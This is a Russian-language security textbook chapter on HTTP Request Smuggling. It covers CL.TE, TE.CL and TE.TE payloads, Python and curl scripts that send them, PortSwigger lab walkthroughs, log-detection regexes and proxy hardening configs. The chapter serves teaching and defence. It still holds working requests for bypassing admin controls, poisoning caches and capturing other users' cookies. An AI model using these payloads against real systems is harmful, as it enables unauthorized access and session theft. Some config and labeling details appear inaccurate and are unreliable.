# Глава 14.1: HTTP Request Smuggling

## 🎯 Цели главы

- Понять природу HTTP Request Smuggling и почему он возникает в современных веб-инфраструктурах
- Освоить три основных типа атак: CL.TE, TE.CL и TE.TE obfuscation
- Научиться использовать инструмент `smuggler.py` для автоматического обнаружения уязвимостей
- Пройти конкретные лабораторные работы PortSwigger Academy
- Понять последствия: обход аутентификации, Cache Poisoning, Reflected XSS
- Научиться детектировать smuggling-атаки в логах
- Знать методы защиты и корректной конфигурации прокси

---

## 14.1.1 Что такое HTTP Request Smuggling

HTTP Request Smuggling (контрабанда HTTP-запросов) — это атака, которая эксплуатирует неоднозначность в интерпретации HTTP-запросов между компонентами веб-инфраструктуры: фронтенд-прокси и бэкенд-сервером.

### Архитектура, делающая атаку возможной

Современные веб-приложения редко обслуживаются одним сервером. Типичная инфраструктура выглядит так:

```
                    ИНТЕРНЕТ
                        |
                        v
         +-----------------------------+
         |    ФРОНТЕНД (Load Balancer) |
         |    Nginx / AWS ALB / CDN    |
         +-----------------------------+
                        |
            HTTP/1.1 Keep-Alive соединение
            (несколько запросов в одном TCP-соединении)
                        |
                        v
         +-----------------------------+
         |    БЭКЕНД (App Server)      |
         |    Apache / Gunicorn / etc  |
         +-----------------------------+
```

Ключевой момент: фронтенд и бэкенд РАЗДЕЛЯЮТ одно TCP-соединение для обработки нескольких HTTP-запросов от разных пользователей. Это означает, что границы запросов должны быть чётко определены.

### Два метода определения границы тела запроса

HTTP/1.1 предоставляет два способа указать, где заканчивается тело запроса:

**1. Content-Length (CL)**
```http
POST /search HTTP/1.1
Host: example.com
Content-Length: 11

q=smuggling
```

**2. Transfer-Encoding: chunked (TE)**
```http
POST /search HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

b
q=smuggling
0

```

В chunked-кодировании:
- `b` = 11 в шестнадцатеричном (длина следующего чанка)
- `q=smuggling` = данные (11 байт)
- `0` = завершающий чанк (конец тела)

### Почему возникает неоднозначность

RFC 7230 гласит: если в запросе присутствуют оба заголовка — Content-Length и Transfer-Encoding — то Transfer-Encoding должен иметь приоритет, а Content-Length должен быть проигнорирован.

**Проблема**: разные серверы реализуют это по-разному:

| Сервер       | Поведение при CL + TE      |
|--------------|---------------------------|
| nginx < 1.13 | Приоритет CL              |
| Apache 2.4   | Приоритет TE              |
| IIS 10       | Приоритет TE              |
| HAProxy      | Зависит от конфигурации   |
| AWS ALB      | Приоритет TE              |

Когда фронтенд и бэкенд используют разные правила, возникает возможность "контрабанды".

---

## 14.1.2 Тип CL.TE — Content-Length на фронтенде, Transfer-Encoding на бэкенде

### Принцип работы

```
ФРОНТЕНД смотрит на Content-Length
БЭКЕНД смотрит на Transfer-Encoding

Злоумышленник отправляет:
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13      <-- Фронтенд: тело = 13 байт
Transfer-Encoding: chunked

0            <-- TE: завершающий чанк (бэкенд думает: запрос окончен)
             <-- пустая строка после 0
SMUGGLED     <-- это остаётся в буфере бэкенда!
```

### Детальный разбор

Шаг 1: Атакующий отправляет запрос:

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**Что видит фронтенд (использует CL=6):**
```
Тело запроса = "0\r\n\r\nG" (6 байт)
Весь запрос передаётся бэкенду как есть.
```

**Что видит бэкенд (использует TE):**
```
Чанк "0" = конец тела запроса.
Символ "G" остаётся в буфере TCP-соединения.
```

Шаг 2: Следующий легитимный запрос другого пользователя:
```http
GET /private HTTP/1.1
Host: vulnerable.com
...
```

Бэкенд видит его как:
```http
GGET /private HTTP/1.1
...
```

Что приводит к ошибке или неожиданному поведению.

### Практическая эксплуатация CL.TE: bypass аутентификации

Задача: получить доступ к `/admin`, который доступен только с IP 127.0.0.1.

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

Следующий запрос жертвы будет дополнен нашим префиксом:

```http
GET /admin HTTP/1.1
X-Ignore: XGET /search HTTP/1.1
Host: vulnerable.com
...
```

Если бэкенд видит `GET /admin`, он проверяет IP — а IP здесь будет внутренний (127.0.0.1), т.к. запрос пришёл от фронтенда!

---

## 14.1.3 Тип TE.CL — Transfer-Encoding на фронтенде, Content-Length на бэкенде

### Принцип работы

```
ФРОНТЕНД смотрит на Transfer-Encoding
БЭКЕНД смотрит на Content-Length

Злоумышленник отправляет многошаговый запрос:

POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4      <-- Бэкенд: тело = 4 байта ("56\r\n")
Transfer-Encoding: chunked  <-- Фронтенд: читает чанки

56            <-- Фронтенд: чанк 0x56 = 86 байт
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0             <-- Фронтенд: конец передачи

             <-- пустая строка
```

### Детальный пример TE.CL

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
POST /admin HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

username=carlos
0


```

**Разбор:**
- Фронтенд (TE): читает чанк `87` (135 байт), затем `0` — конец. Весь блок передаётся бэкенду.
- Бэкенд (CL=4): читает первые 4 байта (`87\r\n`), считает запрос завершённым.
- Оставшееся (`POST /admin...`) остаётся в буфере и будет интерпретировано как начало следующего запроса.

### Критически важный момент: точность байтов

В TE.CL-атаках размер чанка должен быть точным. Считаем байты:

```python
# Тело контрабандного запроса
smuggled = (
    "POST /admin HTTP/1.1\r\n"
    "Host: vulnerable.com\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "username=carlos"
)

print(f"Длина: {len(smuggled)} байт")
print(f"В hex: {len(smuggled):x}")
```

---

## 14.1.4 Тип TE.TE — Obfuscation Transfer-Encoding

### Концепция

Оба сервера (фронтенд и бэкенд) поддерживают Transfer-Encoding. Но если мы можем заставить ОДИН из них игнорировать заголовок TE через обфускацию — получаем неоднозначность.

### Техники обфускации TE

```http
# Вариант 1: Пробел перед значением
Transfer-Encoding: xchunked

# Вариант 2: Дополнительный пробел
Transfer-Encoding : chunked

# Вариант 3: Смешанный регистр
Transfer-Encoding: Chunked
Transfer-Encoding: CHUNKED

# Вариант 4: Таб вместо пробела
Transfer-Encoding:[TAB]chunked

# Вариант 5: Перенос строки (CRLF injection)
Transfer-Encoding: chunked
Transfer-encoding: x

# Вариант 6: Несуществующее расширение
Transfer-Encoding: identity,chunked

# Вариант 7: Двойной заголовок
Transfer-Encoding: chunked
Transfer-Encoding: x

# Вариант 8: Заголовок с CR
Transfer-Encoding: chunked\r
```

### Пример TE.TE атаки

Если фронтенд игнорирует `Transfer-Encoding: xchunked`, но бэкенд его принимает:

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GET /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

Фронтенд видит `Transfer-Encoding: x` (неизвестное) и переключается на CL.
Бэкенд видит первый `Transfer-Encoding: chunked` и использует его.
Итог: поведение CL.TE!

---

## 14.1.5 Инструмент smuggler.py

### Установка

```bash
# Клонирование репозитория
git clone https://github.com/defparam/smuggler.git
cd smuggler

# Установка зависимостей
pip3 install -r requirements.txt

# Проверка
python3 smuggler.py --help
```

### Основные параметры

```
Использование: smuggler.py [опции] -u <url>

Основные опции:
  -u URL        Целевой URL
  -t TIMEOUT    Таймаут в секундах (по умолчанию: 5)
  -m METHOD     HTTP-метод (GET/POST, по умолчанию: POST)
  -x            Режим экспорта результатов
  -v            Подробный вывод
  --log FILE    Сохранение результатов в файл
```

### Использование

```bash
# Базовое сканирование
python3 smuggler.py -u https://target.com/

# Сканирование с повышенным таймаутом (для медленных серверов)
python3 smuggler.py -u https://target.com/ -t 10

# Сканирование POST-эндпоинта
python3 smuggler.py -u https://target.com/api/data -m POST

# Подробный режим с логированием
python3 smuggler.py -u https://target.com/ -v --log results.txt

# Сканирование нескольких хостов из файла
cat targets.txt | while read url; do
    python3 smuggler.py -u "$url" --log "results_$(date +%s).txt"
    sleep 2
done
```

### Интерпретация результатов

```
[##########] Initializing target
[~] Checking if target is vulnerable to CL.TE desync
[~] Checking if target is vulnerable to TE.CL desync
[+] FOUND: CL.TE desync!
    Payload: [Transfer-Encoding: chunked\r\nContent-Length: X]
    Response time: 10.02s (anomaly detected)
```

Признаки уязвимости:
- Значительная задержка ответа (>5 сек) при таймаут-атаке
- Неожиданный 400/500 от следующего запроса
- Изменение тела ответа

### Ручная проверка с curl

```bash
# Тест CL.TE (ожидаем задержку ~10 секунд)
curl -s -o /dev/null -w "%{time_total}" \
  --http1.1 \
  -X POST \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  --data $'3\r\nabc\r\nX' \
  https://target.com/

# Если время > 10 сек — возможно CL.TE!
```

### Python-скрипт для ручного тестирования

```python
#!/usr/bin/env python3
"""
HTTP Request Smuggling manual tester
"""
import socket
import ssl
import time

def send_smuggling_payload(host, port, use_tls=True):
    """Отправка CL.TE payload напрямую через сокет"""
    
    # Payload для CL.TE timeout test
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"  # Этот байт "завис" в буфере бэкенда
    )
    
    # Создаём сокет
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    
    if use_tls:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)
    
    try:
        sock.connect((host, port))
        
        start = time.time()
        sock.send(payload.encode())
        
        # Ждём ответ
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        elapsed = time.time() - start
        
        print(f"[*] Время ответа: {elapsed:.2f}s")
        print(f"[*] Первые 200 байт ответа:")
        print(response[:200].decode(errors='replace'))
        
        if elapsed > 5:
            print("[!] ВОЗМОЖНАЯ УЯЗВИМОСТЬ: аномально долгий ответ!")
        
    finally:
        sock.close()

if __name__ == "__main__":
    send_smuggling_payload("vulnerable-site.com", 443, use_tls=True)
```

---

## 14.1.6 Практика в PortSwigger Academy

### Список лабораторных работ

PortSwigger Academy имеет 9 лабораторных по HTTP Request Smuggling:

| Лаборатория | Тип | Сложность | Цель |
|-------------|-----|-----------|------|
| Lab 1 | CL.TE | Practitioner | Basic detection |
| Lab 2 | TE.CL | Practitioner | Basic TE.CL |
| Lab 3 | TE.TE | Practitioner | Obfuscation |
| Lab 4 | CL.TE | Practitioner | Bypass access controls |
| Lab 5 | TE.CL | Practitioner | Bypass access controls |
| Lab 6 | CL.TE | Practitioner | Capture requests |
| Lab 7 | TE.CL | Practitioner | Capture requests |
| Lab 8 | CL.TE | Practitioner | Reflected XSS |
| Lab 9 | H2.CL | Expert | HTTP/2 downgrading |

### Lab 1: CL.TE Basic Detection

**URL:** `https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te`

**Задача:** Подтвердить, что сайт уязвим к CL.TE smuggling.

**Шаг 1:** Настройка Burp Suite
```
1. Откройте Burp Suite
2. Перейдите в Proxy → Intercept
3. Включите intercept
4. Зайдите на сайт лаборатории
```

**Шаг 2:** Формирование payload в Burp Repeater
```
ВАЖНО: В Burp Repeater → настройки → отключить "Update Content-Length"
```

**Запрос для отправки:**
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404NotExist HTTP/1.1
X-Ignore: X
```

**Ожидаемый результат:**
- Первый запрос: `200 OK`
- Второй запрос (отправить тот же): `404 Not Found`

Если второй запрос возвращает 404 — сайт уязвим!

### Lab 4: CL.TE — Bypass Access Controls

**URL:** `https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-security-controls-cl-te`

**Задача:** Получить доступ к `/admin` и удалить пользователя.

**Шаг 1:** Выяснить структуру ответа /admin
```http
GET /admin HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

Ответ: `401 Unauthorized - Admin interface only available if logged in as an administrator, or if requested from loopback`

**Шаг 2:** Контрабанда запроса к /admin

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

**Шаг 3:** Отправить дважды быстро
- Первая отправка: `200 OK` (или ошибка)
- Вторая отправка: должна вернуть содержимое `/admin`

**Шаг 4:** Удалить пользователя

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-Ignore: X
```

### Lab 8: Reflected XSS через Request Smuggling

**Задача:** Эксплуатировать XSS, недоступный обычным способом из-за WAF/фильтрации.

**Шаг 1:** Найти XSS-точку в User-Agent

```http
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
User-Agent: <script>alert(1)</script>
```

WAF блокирует — но через smuggling можно!

**Шаг 2:** Контрабанда XSS-запроса

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

---

## 14.1.7 Последствия атаки

### 1. Bypass Authentication и Access Control

```
Атакующий контрабандирует:        Жертва отправляет:
                                   GET /home HTTP/1.1
POST / HTTP/1.1          →         ...
...                                
0

GET /admin HTTP/1.1                Бэкенд видит:
X-Custom-IP: 127.0.0.1   →         GET /admin HTTP/1.1
X-Ignore: X                        X-Custom-IP: 127.0.0.1
                                   X-Ignore: XGET /home...
```

### 2. Cache Poisoning через Smuggling

Суть: "отравить" кэш фронтенда так, чтобы легитимные пользователи получали вредоносный контент.

```
Атакующий контрабандирует вредоносный ответ в кэш:

POST / HTTP/1.1
Host: target.com
Content-Length: 166
Transfer-Encoding: chunked

0

GET /static/include.js HTTP/1.1
Host: target.com
Content-Length: 1000
Content-Type: application/x-www-form-urlencoded

response=HTTP/1.1 200 OK
Content-Type: application/javascript

alert(document.cookie)
```

### 3. Перехват запросов пользователей

Самая опасная атака — позволяет получить данные других пользователей:

```http
POST /post/comment HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 800
Cookie: session=YOUR-SESSION-TOKEN

csrf=valid-token&postId=5&name=attacker&email=a@a.com&comment=x
```

Бэкенд ждёт 800 байт. Когда следующий пользователь отправит запрос — его данные (включая Cookie!) добавятся к нашему комментарию!

### 4. HTTP Response Splitting

```
Контрабанда фейкового HTTP-ответа в буфер:

Запрос контрабанды:
POST / HTTP/1.1
...
Transfer-Encoding: chunked

0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 100

<html>Fake page with malware</html>
```

---

## 14.1.8 Детектирование Smuggling в логах

### Признаки атаки в access-логах

**Нормальный паттерн:**
```
192.168.1.1 - - [25/Feb/2026:10:00:01 +0000] "GET /home HTTP/1.1" 200 1234
192.168.1.2 - - [25/Feb/2026:10:00:02 +0000] "GET /about HTTP/1.1" 200 2345
```

**Подозрительный паттерн (признаки smuggling):**
```
192.168.1.1 - - [25/Feb/2026:10:00:01 +0000] "POST / HTTP/1.1" 200 100
192.168.1.1 - - [25/Feb/2026:10:00:01 +0000] "GET /admin HTTP/1.1" 403 45
10.0.0.5   - - [25/Feb/2026:10:00:01 +0000] "GGET /api/data HTTP/1.1" 400 -
10.0.0.5   - - [25/Feb/2026:10:00:02 +0000] "POST /search\r\nHost:..." 400 -
```

### Ключевые индикаторы компрометации (IoC)

| Индикатор | Описание | Приоритет |
|-----------|----------|-----------|
| Метод запроса не из словаря | `GGET`, `PPOST`, `\x00GET` | Критический |
| URL начинается с заголовка | `GET /path\r\nHost:...` | Критический |
| 400 ошибки от бэкенда | Внезапный всплеск 400/500 | Высокий |
| Непоследовательные IP | Один запрос с разных "IP" | Высокий |
| Дублирование заголовков в логе | `Transfer-Encoding` дважды | Средний |
| Нетипичные методы с телом | GET с Content-Length | Средний |

### Скрипт анализа логов

```python
#!/usr/bin/env python3
"""
Анализатор логов на признаки HTTP Request Smuggling
"""
import re
import sys
from collections import defaultdict

SUSPICIOUS_PATTERNS = [
    # Сдвоенные методы
    r'"(GET|POST|PUT|DELETE)(GET|POST|PUT|DELETE)',
    # Заголовки в URL
    r'"[A-Z]+ /[^\s]*\r\n',
    # Нетипичные символы в методе
    r'"\x00|\r|\n',
    # Chunked в странных местах
    r'Transfer-Encoding.*chunked.*GET',
]

def analyze_log(filepath):
    anomalies = defaultdict(list)
    
    with open(filepath, 'r', errors='replace') as f:
        for line_num, line in enumerate(f, 1):
            for pattern in SUSPICIOUS_PATTERNS:
                if re.search(pattern, line, re.IGNORECASE):
                    anomalies[pattern].append({
                        'line': line_num,
                        'content': line.strip()[:200]
                    })
    
    if not anomalies:
        print("[OK] Подозрительных паттернов не найдено")
        return
    
    print(f"[!] НАЙДЕНО {sum(len(v) for v in anomalies.values())} аномалий:\n")
    for pattern, matches in anomalies.items():
        print(f"Паттерн: {pattern}")
        for m in matches[:5]:  # Показываем первые 5
            print(f"  Строка {m['line']}: {m['content']}")
        print()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Использование: {sys.argv[0]} <access.log>")
        sys.exit(1)
    analyze_log(sys.argv[1])
```

### Мониторинг в реальном времени

```bash
# Мониторинг access.log на подозрительные паттерны
tail -f /var/log/nginx/access.log | \
  grep -E '"(GET|POST){2}|\\r\\n|Transfer-Encoding.*GET' | \
  awk '{print "[ALERT] " $0}'

# Подсчёт 400 ошибок по минутам (всплеск = возможная атака)
awk '/ 400 /{print $4}' /var/log/nginx/access.log | \
  cut -d: -f1,2 | sort | uniq -c | sort -rn | head -20
```

---

## 14.1.9 Защита от HTTP Request Smuggling

### 1. Переход на HTTP/2 end-to-end

HTTP/2 использует бинарный протокол с явными фреймами — проблема неоднозначности CL vs TE устранена на уровне протокола.

```nginx
# nginx как фронтенд с HTTP/2
server {
    listen 443 ssl http2;
    
    location / {
        # Проксирование на бэкенд по HTTP/2 (если бэкенд поддерживает)
        proxy_pass https://backend;
        proxy_http_version 2.0;  # Требует ngx_http_grpc_module
    }
}
```

### 2. Нормализация запросов на фронтенде

```nginx
# nginx: отклонять запросы с обоими заголовками
map $http_transfer_encoding $bad_te {
    "~*chunked" 1;
    default     0;
}

server {
    location / {
        # Если есть и TE и CL — отклонять
        if ($bad_te = 1) {
            set $cl_and_te "${content_length}${bad_te}";
        }
        # Удалять Content-Length при наличии TE
        proxy_set_header Content-Length "";
    }
}
```

### 3. HAProxy — корректная конфигурация

```haproxy
global
    tune.http.maxhdr 150    # Ограничение числа заголовков

defaults
    option http-server-close    # Закрывать соединение после каждого запроса
    # НЕ использовать option http-keep-alive между фронтендом и бэкендом

frontend web_frontend
    bind *:443 ssl crt /etc/ssl/cert.pem
    
    # Отклонять запросы с двойным TE
    http-request deny if { req.hdr_cnt(transfer-encoding) gt 1 }
    
    # Отклонять запросы с обоими CL и TE
    http-request deny if { req.hdr(transfer-encoding) -m found } { req.hdr(content-length) -m found }
    
    default_backend app_backend

backend app_backend
    # Использовать отдельные соединения для каждого запроса
    option http-server-close
```

### 4. Apache — конфигурация защиты

```apache
# /etc/apache2/apache2.conf или .htaccess

# Отклонять запросы с обоими CL и TE
RequestHeader unset Transfer-Encoding

# Включить строгое парсирование HTTP
HttpProtocolOptions Strict

# Ограничение размера заголовков
LimitRequestFieldSize 8190
LimitRequestFields 50
```

### 5. Модернизация архитектуры

```
ДО (уязвимая архитектура):
Internet → [Nginx, HTTP/1.1] → [Backend, HTTP/1.1]
           CL-based           TE-based
           = CL.TE уязвимость!

ПОСЛЕ (защищённая архитектура):
Internet → [Nginx, HTTP/2] → [Backend, HTTP/2]
           бинарный          бинарный
           протокол          протокол
           = нет неоднозначности!

ИЛИ:

Internet → [Nginx] → [Backend]
           Nginx нормализует запросы,
           использует новое соединение
           для каждого запроса
```

### 6. Defensive Headers

```nginx
# Принудительное переопределение заголовков
proxy_set_header Transfer-Encoding "";  # Удалить TE перед проксированием
proxy_set_header Connection "close";    # Не использовать keep-alive к бэкенду
proxy_http_version 1.0;                 # HTTP/1.0 не поддерживает chunked
```

### Чеклист защиты

```
[ ] Использовать HTTP/2 на всех уровнях инфраструктуры
[ ] Отклонять запросы с одновременным CL и TE
[ ] Нормализовать запросы на фронтенде
[ ] Не использовать keep-alive между прокси и бэкендом
[ ] Регулярно проверять логи на аномалии
[ ] Тестировать с smuggler.py в staging окружении
[ ] Обновить все компоненты до актуальных версий
[ ] Внедрить WAF-правила для обнаружения контрабанды
```

---

## 14.1.10 Продвинутые техники: HTTP/2 Request Smuggling

### H2.CL атака

HTTP/2 → HTTP/1.1 downgrade на фронтенде создаёт новый вектор:

```
Клиент → [HTTP/2] → Фронтенд → [HTTP/1.1] → Бэкенд

Атакующий отправляет HTTP/2-запрос:
:method: POST
:path: /
:authority: target.com
content-type: application/x-www-form-urlencoded
content-length: 0    ← HTTP/2 поле (бэкенд использует это как CL!)

GET /admin HTTP/1.1  ← Тело запроса (фронтенд передаёт как есть)
X-Ignore: X
```

### H2.TE атака

```python
#!/usr/bin/env python3
"""
HTTP/2 Request Smuggling тест с использованием h2 библиотеки
"""
import h2.connection
import h2.config
import h2.events
import socket
import ssl

def h2_smuggling_test(host, port=443):
    # Создаём TLS-соединение
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])
    
    sock = socket.create_connection((host, port))
    tls_sock = ctx.wrap_socket(sock, server_hostname=host)
    
    # Инициализируем HTTP/2 клиент
    config = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    tls_sock.sendall(conn.data_to_send())
    
    # Отправляем "контрабандный" запрос
    headers = [
        (':method', 'POST'),
        (':path', '/'),
        (':authority', host),
        (':scheme', 'https'),
        ('content-type', 'application/x-www-form-urlencoded'),
        # Встраиваем TE в заголовки HTTP/2
        ('transfer-encoding', 'chunked'),
    ]
    
    body = b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + host.encode() + b"\r\nX-Ignore: X\r\n\r\n"
    
    conn.send_headers(1, headers)
    conn.send_data(1, body, end_stream=True)
    tls_sock.sendall(conn.data_to_send())
    
    print("[*] H2 smuggling payload отправлен")
    print("[*] Проверьте следующий запрос на аномалии")
```

---

## 14.1.11 Практические упражнения

### Упражнение 1: Настройка тестовой среды

```bash
# Запустить уязвимое приложение через Docker
docker run -d \
  --name smuggling-lab \
  -p 8080:80 \
  ghcr.io/defparam/smuggling-lab:latest

# Проверить доступность
curl -v http://localhost:8080/
```

### Упражнение 2: Базовое обнаружение с smuggler.py

```bash
# Сканировать локальную лабораторию
python3 smuggler.py -u http://localhost:8080/ -v

# Ожидаемый вывод:
# [+] FOUND: CL.TE desync vulnerability!
```

### Упражнение 3: Ручное тестирование CL.TE в Burp Suite

1. Откройте Burp Suite → Repeater
2. Создайте новый запрос:
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
3. Отключите автоматическое обновление Content-Length
4. Отправьте запрос
5. Немедленно отправьте второй запрос: `GET / HTTP/1.1`
6. Зафиксируйте результат

### Упражнение 4: PortSwigger Labs

Выполнить в порядке возрастания сложности:
1. **Lab 1**: HTTP request smuggling, basic CL.TE vulnerability
2. **Lab 2**: HTTP request smuggling, basic TE.CL vulnerability  
3. **Lab 3**: HTTP request smuggling, obfuscating the TE header
4. **Lab 4**: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE

### Упражнение 5: Создание собственного детектора

```python
#!/usr/bin/env python3
"""
Задание: дополните этот детектор для обнаружения TE.CL уязвимостей
"""
import requests
import time

def detect_cl_te(url):
    """Обнаружение CL.TE через тест задержки"""
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '6',
        'Transfer-Encoding': 'chunked',
    }
    body = "0\r\n\r\nX"
    
    start = time.time()
    try:
        r = requests.post(url, headers=headers, data=body, timeout=15)
        elapsed = time.time() - start
        
        if elapsed > 9:
            return True, f"Задержка {elapsed:.1f}s - возможная уязвимость!"
        return False, f"Задержка {elapsed:.1f}s - вероятно безопасно"
    except requests.Timeout:
        return True, "Timeout - высокая вероятность CL.TE!"

def detect_te_cl(url):
    """TODO: Реализуйте обнаружение TE.CL"""
    # Подсказка: отправьте запрос с правильным TE chunked
    # но некорректным CL, наблюдайте за поведением
    pass

# Тест
url = "http://localhost:8080/"
result, msg = detect_cl_te(url)
print(f"CL.TE: {'УЯЗВИМ' if result else 'ЗАЩИЩЁН'} - {msg}")
```

### Упражнение 6: Анализ логов

```bash
# Скачать тестовый лог-файл и проанализировать
cat > /tmp/test.log << 'EOF'
192.168.1.1 - - [25/Feb/2026:10:00:01] "POST / HTTP/1.1" 200 100
192.168.1.2 - - [25/Feb/2026:10:00:02] "GGET /admin HTTP/1.1" 400 0
192.168.1.3 - - [25/Feb/2026:10:00:03] "GET /home HTTP/1.1" 200 500
10.0.0.1   - - [25/Feb/2026:10:00:04] "POST /login\r\nHost: evil.com HTTP/1.1" 400 0
EOF

python3 log_analyzer.py /tmp/test.log
```

---

## Итоги главы

| Тип атаки | Фронтенд | Бэкенд | Сложность | Опасность |
|-----------|----------|--------|-----------|-----------|
| CL.TE     | CL       | TE     | Низкая    | Критическая |
| TE.CL     | TE       | CL     | Средняя   | Критическая |
| TE.TE     | TE (обф) | TE     | Высокая   | Критическая |
| H2.CL     | HTTP/2   | CL     | Высокая   | Критическая |

### Ключевые выводы

- HTTP Request Smuggling возникает из-за неоднозначности в парсинге HTTP между компонентами
- Три основных типа: CL.TE, TE.CL, TE.TE
- Последствия варьируются от bypass аутентификации до перехвата сессий пользователей
- Основная защита: HTTP/2 end-to-end или нормализация запросов на фронтенде
- Регулярное сканирование с smuggler.py обязательно для production-инфраструктуры

### Дополнительные ресурсы

- [PortSwigger Research: HTTP Request Smuggling](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [RFC 7230 — Message Syntax and Routing](https://tools.ietf.org/html/rfc7230)
- [smuggler.py GitHub](https://github.com/defparam/smuggler)
- [HTTP Request Smuggling cheatsheet](https://github.com/drek4/CheatSheets/blob/master/Http-Request-Smuggling.md)
